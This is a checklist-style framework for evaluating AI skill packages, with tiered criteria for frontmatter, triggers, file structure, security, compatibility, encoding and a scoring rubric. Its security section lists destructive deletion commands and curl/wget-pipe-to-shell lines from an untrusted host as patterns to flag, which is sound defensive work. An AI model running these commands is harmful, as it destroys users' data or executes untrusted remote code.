# Evaluation Framework Details

This document provides detailed criteria for each dimension of the skill evaluation framework. Dimensions are organized by priority tier.

---

## Tier 1: Skill-Critical Dimensions

### 1. Frontmatter & Trigger Mechanism Analysis

#### `name` Field Checklist
- [ ] Uses lowercase letters only
- [ ] Words separated by hyphens (e.g., `my-skill-name`)
- [ ] Descriptive and concise
- [ ] No special characters, spaces, or uppercase letters

#### `description` Field Checklist
- [ ] Clearly states what the skill does (functionality summary)
- [ ] Includes explicit "when to use" information
- [ ] Uses the recommended pattern: "[What it does]. USE THIS SKILL when the user wants to: (1)... (2)... (3)..."
- [ ] Word count >= 50 (aim for 80+)
- [ ] Does NOT defer "when to use" information to the body
- [ ] Covers the full scope of the skill's capabilities

#### `triggers` Field Checklist
- [ ] At least 10-20 triggers present
- [ ] Includes English keywords
- [ ] Includes Chinese keywords
- [ ] Covers verb variations (create/creating/created, make/making/made)
- [ ] Covers phrasings variations ("create skill" / "create a skill" / "make a new skill")
- [ ] Includes domain-specific terms related to the skill's purpose
- [ ] Includes natural user expressions (how real users would phrase requests)
- [ ] No duplicate triggers
- [ ] No overly generic triggers that would cause false activation

#### Common Frontmatter Red Flags
- Description under 30 words (almost certainly too brief)
- Fewer than 5 triggers (skill will rarely activate)
- English-only triggers (excludes Chinese-speaking users)
- "When to Use" section in SKILL.md body instead of description
- Extraneous YAML fields (version, author, etc.) unless specifically needed

### 2. Context Efficiency Analysis

#### SKILL.md Body Assessment
- [ ] Total line count under 500 (hard limit per Skill Creator spec)
- [ ] Every paragraph passes the "Does Claude really need this?" test
- [ ] No explanations of common knowledge (e.g., "Python is a programming language")
- [ ] No verbose descriptions where concise examples would suffice
- [ ] Imperative/infinitive form used throughout (not descriptive prose)

#### Progressive Disclosure Compliance
- [ ] Level 1 (metadata): Name + description + triggers kept concise (~100 words)
- [ ] Level 2 (SKILL.md body): Core workflow and essential instructions only
- [ ] Level 3 (bundled resources): Detailed references, scripts, and assets loaded on demand
- [ ] SKILL.md body provides clear navigation to reference files with read-timing guidance
- [ ] Reference files are NOT loaded unnecessarily

#### Content Placement Analysis
- [ ] Detailed reference material is in `references/`, not in SKILL.md
- [ ] Variant-specific details (patterns, examples, configs) are in separate reference files
- [ ] Only core workflow and selection guidance remain in SKILL.md
- [ ] No information duplication between SKILL.md and reference files

#### Token Cost Assessment
- Estimate SKILL.md body token count (~0.75 tokens per word for English, ~1.5 for CJK)
- Flag if body exceeds ~3k tokens (approaching the 5k word budget)
- Compare information density: useful instructions per 100 tokens

### 3. Skill Architecture & Directory Structure Analysis

#### Required Structure Compliance
- [ ] SKILL.md exists at the root of the skill directory
- [ ] SKILL.md has valid YAML frontmatter with required fields
- [ ] Only standard directories used: `scripts/`, `references/`, `assets/`
- [ ] No non-standard directories or organizational files

#### Prohibited Files Check
The following files must NOT exist in a skill:
- README.md
- INSTALLATION_GUIDE.md
- QUICK_REFERENCE.md
- CHANGELOG.md
- CONTRIBUTING.md
- LICENSE (unless specifically required and referenced in frontmatter)
- Any user-facing documentation not intended for Claude's consumption

#### Reference File Management
- [ ] All reference files are explicitly linked from SKILL.md
- [ ] Each link includes guidance on WHEN to read the file
- [ ] References are one level deep (no reference-to-reference chains)
- [ ] Files > 100 lines include a table of contents at the top
- [ ] Files > 10k words have grep search patterns documented in SKILL.md
- [ ] No orphaned reference files (files not linked from SKILL.md)

#### Script Quality
- [ ] Scripts are executable and tested
- [ ] Scripts use cross-platform compatible patterns (prefer Python with `pathlib`)
- [ ] Scripts handle errors gracefully with clear error messages
- [ ] Scripts do not contain hardcoded paths or credentials

#### Asset Appropriateness
- [ ] Assets are files used in output (templates, images, fonts), not documentation
- [ ] Assets are not unnecessarily large
- [ ] Asset file formats are appropriate for their use case

#### Progressive Disclosure Patterns Check
Verify the skill uses one of the recommended patterns:

**Pattern 1 - High-level guide with references**:
SKILL.md contains quick start + links to detailed reference files.

**Pattern 2 - Domain-specific organization**:
References organized by domain/variant, loaded selectively.

**Pattern 3 - Conditional details**:
Basic content in SKILL.md, advanced content linked conditionally.

---

## Tier 2: Quality & Safety Dimensions

### 4. Security & Risk Assessment

#### Dangerous Operations to Scan For

**File System Operations** (High risk):
```
rm -rf /path
del /s /q *
rm -rf
rmdir /s /q
```

**Code Execution** (High risk):
```
eval()
exec()
subprocess.call() with unsanitized input
system() with unsanitized input
os.system()
```

**Network Operations** (High risk):
```
curl http://untrusted-url.com | bash
wget ... | sh
Requests to unknown endpoints
```

#### Prompt Injection Risk Assessment
- [ ] Does skill accept user input that could contain malicious prompts?
- [ ] Are there security gaps where user input bypasses filters?
- [ ] Does skill use any external APIs that could be manipulated?
- [ ] Are there trust boundaries that could be crossed?

#### Data Leakage Risk Assessment
- [ ] Debug output that might leak sensitive information?
- [ ] Log files that might contain credentials?
- [ ] Error messages that reveal internal system paths?
- [ ] Network traffic that might be intercepted?

#### User Confirmation Requirements
- [ ] Destructive operations require explicit user consent?
- [ ] Confirmation prompts exist for risky operations?
- [ ] Clear warning messages provided?
- [ ] Undo mechanism available where feasible?

### 5. Environment & Platform Compatibility

#### OS-Specific Requirements

**Windows-Specific**:
- Path separator differences (`\` vs `/`)
- Command differences (dir vs ls, copy vs cp)
- PowerShell vs CMD differences
- Registry access (if applicable)
- Windows-specific permissions

**macOS-Specific**:
- Path case sensitivity
- Permission model differences
- Homebrew vs system utilities

**Linux-Specific**:
- Package manager differences (apt, yum, pacman)
- File system differences
- Permission model differences

#### Cross-Platform Best Practices for Skills
- [ ] Skill detects OS before executing platform-specific commands
- [ ] Uses Python `pathlib` or `os.path` instead of hardcoded path separators
- [ ] Provides instructions for different shells (PowerShell/CMD vs Bash/Zsh) if applicable
- [ ] Uses Python `platform` module for OS detection in scripts
- [ ] Handles path differences (forward slashes vs backslashes)

#### Graceful Degradation
- [ ] Handles missing dependencies gracefully with clear error messages?
- [ ] Fallback mechanisms exist?
- [ ] Continues with limited functionality when possible?

### 6. Dependency & File Bundling Analysis

#### External Dependencies Checklist
- [ ] All external libraries, packages, or tools listed
- [ ] Missing dependency documentation identified
- [ ] Deprecated or insecure dependencies flagged
- [ ] Dependency licensing compatibility verified
- [ ] Dependency version conflicts assessed

#### Common Dependency Red Flags
- Dependencies without version pinning (e.g., `requests` vs `requests==2.31.0`)
- Dependencies from unverified sources
- Dependencies with known security vulnerabilities
- Circular dependencies

#### File Bundling Checklist
- [ ] All included files, templates, or configuration files identified
- [ ] File size and type are appropriate
- [ ] File paths are cross-platform compatible
- [ ] No sensitive data is bundled
- [ ] File structure follows skill conventions

---

## Tier 3: Polish & Enhancement Dimensions

### 7. Encoding & Internationalization Compatibility

#### Skill-Specific Encoding Rules (MANDATORY)
- [ ] **Zero emojis** across ALL files in the skill package
- [ ] **No non-standard special characters** (stylized quotes, unusual math symbols, etc.)
- [ ] Applies to: SKILL.md, scripts/*.py, references/*.md, assets/*, test files, sample data

#### UTF-8 Compatibility Testing

**CJK Character Testing**:
- Chinese characters (simplified and traditional)
- Japanese characters (hiragana, katakana, kanji)
- Korean characters (hangul)
- Mixed CJK-English text

**File Path Testing**:
- Paths with Chinese characters
- Paths with special characters
- Paths with spaces
- Paths with non-ASCII characters

#### Locale Handling Checklist
- [ ] Skill respects system locale settings?
- [ ] Date/time formats are locale-aware?
- [ ] Number formats handled correctly?
- [ ] Error messages readable regardless of locale?

#### Common Encoding Issues
- **File I/O**: Wrong encoding when reading/writing files
- **Command-line**: System encoding differences (Windows vs Unix)
- **Output**: Expected output differs based on console encoding
- **External tools**: Tools expecting different encodings than skill provides

### 8. Documentation Quality Assessment

#### Skill-Specific Writing Standards
- [ ] **Imperative/infinitive form** used throughout (e.g., "Extract text from PDF" not "This skill extracts text from PDFs")
- [ ] **Concise examples preferred** over verbose explanations
- [ ] **Challenge every paragraph**: "Does Claude really need this explanation?"
- [ ] **No unnecessary jargon**: Simple, direct language

#### Structure & Organization
- Clear title and purpose statement
- Logical section hierarchy
- Correct heading level usage (H1, H2, H3)
- Easy to find specific information

#### Completeness
- Usage examples with expected output
- Parameter descriptions where applicable
- Error handling guidance
- Limitations documented

#### Freedom Level Assessment
Evaluate whether the skill uses appropriate specificity for each operation:

| Task Type | Recommended Freedom | Example |
|-----------|-------------------|---------|
| Flexible, many valid approaches | High (text instructions) | "Choose appropriate data visualization" |
| Preferred pattern exists | Medium (pseudocode/parameterized) | "Use this template with parameters X, Y" |
| Fragile, error-prone operations | Low (specific scripts) | "Run scripts/rotate_pdf.py with arguments" |

- [ ] Freedom level matches task fragility for each operation in the skill
- [ ] Fragile operations use specific scripts (low freedom)
- [ ] Flexible operations use text guidance (high freedom)

#### Formatting Standards
- Consistent markdown syntax
- Correct code block formatting with language labels
- Proper list and table formatting
- Working internal links to reference files

### 9. Functional Analysis & Improvement Opportunities

#### Current Limitations Assessment
- **Edge Cases**: What happens with unexpected input?
- **Error Handling**: Are all error cases covered?
- **Performance**: Any bottlenecks or slow operations?
- **Scalability**: Can skill handle large inputs?

#### Potential Enhancements
- **Missing Features**: What would significantly improve user experience?
- **Better Patterns**: Are there cleaner implementation alternatives?
- **Integration Points**: Could this skill work with other tools?
- **Configuration Options**: Would more options help?

#### Best Practice Gaps
- **Code Quality**: DRY principle violations, magic numbers/strings
- **Error Handling**: Try-catch blocks, error propagation
- **Testing**: Are scripts tested and verified?
- **Maintainability**: Complexity, coupling, cohesion

---

## Evaluation Scoring Guidelines

### Score Calculation

**Tier 1 dimensions (60% of total score)**:
- Frontmatter & Triggers: 25 points
- Context Efficiency: 20 points
- Skill Architecture: 15 points

**Tier 2 dimensions (25% of total score)**:
- Security: 10 points
- Platform Compatibility: 8 points
- Dependencies: 7 points

**Tier 3 dimensions (15% of total score)**:
- Encoding: 5 points
- Documentation: 5 points
- Functionality: 5 points

### Rating Thresholds

| Rating | Score Range | Criteria |
|--------|------------|----------|
| Excellent | 90-100 | No Critical/High issues. All Tier 1 checks pass. Comprehensive triggers, lean SKILL.md, proper architecture. |
| Good | 70-89 | No Critical issues, at most 1-2 High. Tier 1 mostly passes. Good triggers and reasonable context efficiency. |
| Fair | 50-69 | No Critical issues but multiple High. Some Tier 1 failures. Triggers present but incomplete, SKILL.md somewhat bloated. |
| Poor | < 50 | Critical issues present OR multiple Tier 1 failures. Missing triggers, severely bloated SKILL.md, or broken architecture. |
